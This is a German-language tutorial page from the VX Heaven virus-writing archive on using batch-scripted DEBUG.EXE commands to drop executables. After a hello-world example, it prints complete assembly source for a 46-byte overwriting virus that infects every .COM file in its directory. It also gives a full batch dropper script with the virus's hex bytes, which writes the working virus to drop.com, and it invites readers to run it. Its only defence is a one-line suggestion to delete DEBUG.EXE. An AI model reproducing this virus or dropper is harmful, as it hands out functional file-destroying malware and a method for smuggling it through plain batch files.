<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> ZeroP 'Die Gefahr Von Debug Codes' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="ZeroP"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, ZeroP,Die Gefahr Von Debug Codes, echo, start, offset, debug, anzahl, auch, batch, schon, virus, ouml, uuml, wert, dann, eingeben, schreiben"/>
<meta name="Description" content="Dieses Tutorial zeigt die Gefahr von DEBUG.EXE, wobei Grundkenntnisse in Assembler ben&amp;ouml;tigt werden."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"1492c146b210695cb02d33c41fbda274675b9491-1498757826-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vzp00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Die Gefahr Von Debug Codes</h1><p><a href="/lib/?lang=de&amp;author=ZeroP"> ZeroP</a><br/> <em>Juni 2009</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vzp00.html';</script><div class="ci"><a href="/lib/?ci=vzp00">1</a></div><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/Die%20Gefahr%20Von%20Debug%20Codes.pdf">Download</a> PDF (169.46Kb) (Du musst im <a href="/forum">Forum</a> registriert sein)<br/>[<a style="" href="/lib/?lang=DE&amp;index=DO#vzp00">zurück zum Index</a>] [<a href="/lib/vzp00.html#disqus_thread">Kommentare</a>]<br/> 
<p><strong>Was sind debug codes und wo liegt die Gefahr?</strong></p>
<address>
Autor: 0p_<br/>
Mail: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ec96899e83c29cac8e87c29e99">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
</address>
<div class="copy">
<p>Dieses Werk ist unter einem Creative Commons Namensnennung-Keine kommerzielle Nutzung-Keine Bearbeitung 3.0 Deutschland Lizenzvertrag lizenziert. Um die Lizenz anzusehen, gehen Sie bitte zu http://creativecommons.org/licenses/by-nc-nd/3.0/de/ oder schicken Sie einen Brief an Creative Commons, 171 Second Street, Suite 300, San Francisco, California 94105, USA.</p>
</div>
<h2>Vorwort</h2>
<p>Dieses Tutorial zeigt die Gefahr von DEBUG.EXE, wobei Grundkenntnisse in Assembler ben&ouml;tigt werden.</p>
<p>Debug.exe, ein von Microsoft mitgelieferter Assembler und Disassembler, ist in allen Windows Versionen vorhanden und befindet sich meist in c:\windows\command . Es ist ein Rest aus der MS-DOS Zeit und diente zum Debuggen von Software. Durch die Eingabe von "?" listet DEBUG.exe in der Konsole alle Befehle auf:</p>
<ul style="list-style:none;">
<li>-?</li>
<li>assemblieren A [Adresse]</li>
<li>vergleichen C Bereich Adresse</li>
<li>anzeigen D [Bereich]</li>
<li>eingeben E Adresse [Liste]</li>
<li>f&uuml;llen F Bereich Liste</li>
<li>starten G [=Adresse] [Adressen]</li>
<li>hex rechnen H Wert1 Wert2</li>
<li>einlesen I E/A-Port (I/O port)</li>
<li>laden L [Adresse] [Laufwerk] [ErsterSektor] [Anzahl]</li>
<li>verschieben M Bereich Adresse</li>
<li>benennen N [Pfadname] [Argumentliste]</li>
<li>ausgeben O E/A-Port Byte</li>
<li>ausf&uuml;hren P [=Adresse] [Anzahl]</li>
<li>beenden Q</li>
<li>Registeranzahl R [Register]</li>
<li>suchen S Bereich Liste</li>
<li>verfolgen T [=Adresse] [Wert]</li>
<li>disassemblieren U [Bereich]</li>
<li>schreiben W [Adresse] [Laufwerk] [ErsterSektor] [Anzahl]</li>
<li>Expansionsspeicher zuordnen XA [#Seiten]</li>
<li>Expansionsspeicher freigeben XD [Zugriffsnummer]</li>
<li>Expansionsspeicher abbilden XM [LSeite] [PSeite] [Zugriffsnummer]</li>
<li>Expansionsspeicherstatus anzeigen XS</li>
</ul>
<p>Wie Sie sehen k&ouml;nnen, ist DEBUG wirklich ein kleiner, aber an Funktionen vollst&auml;ndiger Assembler und Disassembler. (Bitte benutzen Sie den "schreiben"-Befehl nicht nach dem try n'fail-Motto, da sinnlose Eingriffe in den Arbeitsspeicher selten gute Folgen haben. ) Bevor wir nun n&auml;her auf die debug codes eingehen, gebe ich noch eine kleine Einf&uuml;hrung in die Arbeit- und Funktionsweise von DEBUG.EXE. Nat&uuml;rlich w&uuml;rde ein Handbuch &uuml;ber DEBUG ganze B&uuml;cher f&uuml;llen, weshalb Sie sich die Verwendung von debug.exe gesondert beibringen sollten. Als Zielprogramm nehme ich das bekannte Hallo-Welt-Programm.</p>
<p>Hier mal der Assembler-Code:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">.</span>model tiny<br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<span style="color: #0000ff; font-weight: bold;">START</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">09h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> offset msg<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">20h</span><br/>
msg &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Hallo Welt!'</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'$'</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">START</span><br/>
&nbsp;</div>
<p>Im Hexeditor sieht das Programm so aus:</p>
<div align="center">
<img src="img/vzp00/fig1.gif" alt=""/>
</div>
<p>Das Programm ist nur 21 Byte gro&szlig; und zeigt nur "Hallo Welt!" an und beendet sich. Wer im Hexcode lesen schon ein wenig ge&uuml;bt ist, erkennt die Folge "CD 21 CD 20" bestimmt schon als "int 21h" und "int 20h".</p>
<p>Im Quellcode oben wird vielen schon das "org 100h" aufgefallen sein, welche auf eine COM-Datei hinweist (100h muss f&uuml;r das PSP Platz gelassen werden). F&uuml;r was steht eigentlich COM? Richtig, f&uuml;r <strong>C</strong>opy <strong>O</strong>f <strong>M</strong>emory. Die Datei wird als Kopie direkt in den Arbeitsspeicher geladen mit dem <strong>P</strong>rogram <strong>S</strong>egment <strong>P</strong>refix (PSP) voran. Wichtig f&uuml;r uns ist, dass COM-Dateien nur aus hexadezimalen "operation codes" bestehen.</p>
<div align="center">
<img src="img/vzp00/fig2.gif" alt=""/>
</div>
<p>So sieht das disassemblierte Programm aus. Hier k&ouml;nnen Sie noch einmal sch&ouml;n sehen, wie der Assemblercode zu einer COM-Datei assembliert wurde. Die meisten Assemblerinstruktionen kennen Sie bereits von dem Quellcode.</p>
<p>Da DEBUG auch ein Assembler ist, k&ouml;nnen Sie den Assemblercode auch von DEBUG assemblieren lassen.</p>
<p>Debug-Backrezept:</p>
<ul>
<li>In DEBUG f&uuml;hren Sie den Befehl "n" aus und &uuml;bergeben ihm als Parameter den Dateinamen, in diesem Beispiel jetzt "helloworld.com".</li>
<li>Nun f&uuml;hren Sie den assemble-Befehl aus, indem Sie"a" eingeben.</li>
<li>Anschlie&szlig;end geben wir die Befehle auf dem Screenshot einzeln ein und best&auml;tigen jeweils mit Return.</li>
<li>Dann "r"eingeben und als Parameter cx angeben. Nun einfach die Gr&ouml;&szlig;e der zu schreibenden Datei angeben.</li>
<li>Die Datei wird dann mit dem Aufruf von "w" gespeichert.</li>
<li>Mit "q" verlassen Sie DEBUG.</li>
</ul>
<div align="center">
<img src="img/vzp00/fig3.gif" alt=""/>
</div>
<p>Sie sehen, dass ich einmal den Befehl "g" benutzt habe. Dadurch starte ich das Programm und wie man am Screenshot sieht, war es erfolgreich.</p>
<p>Wir haben nun ein ein Hallo-Welt Programm erstellt mit DEBUG, aber was soll das ganze? Debug codes sind in Batch verfasste automatisierte DEBUG-Anweisungen. Also kann man mit Batch mit Hilfe von debug codes sich ein Hallo-Welt-Programm zusammenbauen lassen. Schlussfolgerung?</p>
<h2>Ich kann mit DEBUG Assemblercode ausf&uuml;hren.</h2>
<p>Wir haben ja schon gelernt, das Batch f&uuml;r Automatisierungszwecke entwickelt wurde. Nun basteln wir uns eine Automatisierung:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #33cc33;">@</span><a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> off<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> e 0100 B4 09 BA 09 01 <a style="color: #000060;" href="http://www.ss64.com/nt/cd.html"><span style="color: #b1b100; font-weight: bold;">CD</span></a> 21 <a style="color: #000060;" href="http://www.ss64.com/nt/cd.html"><span style="color: #b1b100; font-weight: bold;">CD</span></a> 20 48 61 6C 6C 6F 20 57<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> e 0110 65 6C 74 21 24<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> rcx<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> 15<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> ndrop.com<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> w<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> q<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
debug <span style="color: #33cc33;">&lt;</span> s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/pause.html"><span style="color: #b1b100; font-weight: bold;">pause</span></a><br/>
&nbsp;</div>
<p>Durch das Ausf&uuml;hren wird ein lauff&auml;higes Hallo-Welt-Programm erzeugt. In diesem Skript wird jedoch statt dem "assemble"-Befehl der "enter"-Befehl benutzt. Die Anzahl der zu schreibenden Bytes muss hexadezimal angegeben werden. In unserem Beispiel die 15h (21 dezimal). Auf diese Weise (hier liegt auch die Gefahr)kann auch Schadcode eingeschleust werden.</p>
<p>Die Vorgehensweise ist immer die selbe:</p>
<ol>
<li>Schreibe z.B. eine .COM-Datei mit Assembler</li>
<li>Lie&szlig; sie mit einem Hexeditor ein</li>
<li>&Uuml;bertrage die hexadezimalen Zahlen in das Batchskript und passe Anzahl an Bytes an</li>
<li>Fertig</li>
</ol>
<p>Um jetzt mal Butter bei die Fische zu geben, nehme ich den Quellcode eines Virus, der alle .COM-Datei im selben Verzeichnis infiziert.</p>
<h3>1. Schritt</h3>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Virus &nbsp; <span style="color: #0000ff; font-weight: bold;">SEGMENT</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; ASSUME&nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>Virus<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>Virus<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ORG &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
<span style="color: #0000ff; font-weight: bold;">Start</span><span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4Eh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> offset ComSig<br/>
Next<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jc</span>&nbsp; &nbsp; &nbsp; Quit<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3D02h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">9Eh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> offset Ende <span style="color: #339933;">-</span> offset <span style="color: #0000ff; font-weight: bold;">Start</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> offset <span style="color: #0000ff; font-weight: bold;">Start</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3Eh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4Fh</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; Next<br/>
<br/>
Quit<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">20h</span><br/>
<br/>
ComSig&nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">&quot;*.com&quot;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
<br/>
Ende<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; Virus &nbsp; ENDS<br/>
&nbsp; &nbsp; &nbsp; &nbsp; END &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">Start</span><br/>
&nbsp;</div>
<h3>2. Schritt</h3>
<p>Diesen Quellcode assemblieren wir und schauen ihn uns an:</p>
<div align="center">
<img src="img/vzp00/fig4.gif" alt=""/>
</div>
<p>Erschreckend an diesem Beispiel ist, dass dieses Virus nur 46 Bytes gro&szlig; ist, unser Hallo-Welt-Programm hatte 21 Bytes. Mann kann diesen Virus noch extrem an Gr&ouml;&szlig;e trimmen,sodass er sogar nur 24 Byte gro&szlig; ist.(Dabei verliert er aber die Eigenschaft, alle Dateien im Verzeichnis zu infizieren).</p>
<h3>3. Schritt</h3>
<p>Jetzt passen wir das "Dropper-Skript" an.</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #33cc33;">@</span><a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> off<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> e 0100 B4 4E 33 C9 BA 28 01 <a style="color: #000060;" href="http://www.ss64.com/nt/cd.html"><span style="color: #b1b100; font-weight: bold;">CD</span></a> 21 72 1B B8 02 3D BA 9E<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> e 0110 00 <a style="color: #000060;" href="http://www.ss64.com/nt/cd.html"><span style="color: #b1b100; font-weight: bold;">CD</span></a> 21 93 B4 40 B9 2E 00 BA 00 01 <a style="color: #000060;" href="http://www.ss64.com/nt/cd.html"><span style="color: #b1b100; font-weight: bold;">CD</span></a> 21 B4 3E<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> e 0120 <a style="color: #000060;" href="http://www.ss64.com/nt/cd.html"><span style="color: #b1b100; font-weight: bold;">CD</span></a> 21 B4 4F EB E1 <a style="color: #000060;" href="http://www.ss64.com/nt/cd.html"><span style="color: #b1b100; font-weight: bold;">CD</span></a> 20 2A 2E 63 6F 6D 00<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> rcx<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> 2E<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> ndrop.com<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> w<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/echo.html"><span style="color: #b1b100; font-weight: bold;">echo</span></a> q<span style="color: #33cc33;">&gt;&gt;</span>s<br/>
debug <span style="color: #33cc33;">&lt;</span> s<br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/pause.html"><span style="color: #b1b100; font-weight: bold;">pause</span></a><br/>
&nbsp;</div>
<h3>4. Schritt</h3>
<p>Durch das Ausf&uuml;hren erhalten Sie nun eine Datei namens "drop.com". Diese enth&auml;lt den funktionst&uuml;chtigen Virus. Sie k&ouml;nnen nun gerne den Virus in einen Ordner mit dem Hallo-Welt-Programm kopieren und den Virus ausf&uuml;hren. Sie werden sehen, dass das Hallo-Welt-Programm infiziert wird.</p>
<p>Wenn Sie nun in einem Forum wieder lesen,es sei nicht m&ouml;glich "richtige" Viren mit Batch zu schreiben, dann k&ouml;nnen sie dies nun widerlegen, denn indirekt ist dies durch debug codes m&ouml;glich. Ich hoffe Sie konnten etwas aus diesem Tutorial mitnehmen. Sicherlich m&ouml;chten Sie jetzt noch wissen, wie man sich gegen solche Viren sch&uuml;tzt, die ihren Schadcode per DEBUG "droppen". Benennen Sie einfach DEBUG.EXE um oder l&ouml;schen Sie es.</p>
<h2>Dank</h2>
<p>Danken m&ouml;chte ich an dieser Stelle folgenden Personen:</p>
<ul>
<li>Sophie</li>
<li>Raed</li>
<li>Jojo</li>
<li>Brian</li>
<li>SkyOut</li>
<li>herm1t</li>
<li>Holger "Olli" R.</li>
</ul>
<p>MfG 0p_</p>
[<a style="" href="/lib/?lang=DE&amp;index=DO#vzp00">zurück zum Index</a>] [<a href="/lib/vzp00.html#disqus_thread">Kommentare</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vzp00">de</a><a href="/lib/index.php?lang=en&amp;id=vzp00">en</a><a href="/lib/index.php?lang=es&amp;id=vzp00">es</a><a href="/lib/index.php?lang=it&amp;id=vzp00">it</a><a href="/lib/index.php?lang=fr&amp;id=vzp00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vzp00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vzp00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vzp00">ua</a></div>
</body>
</html>
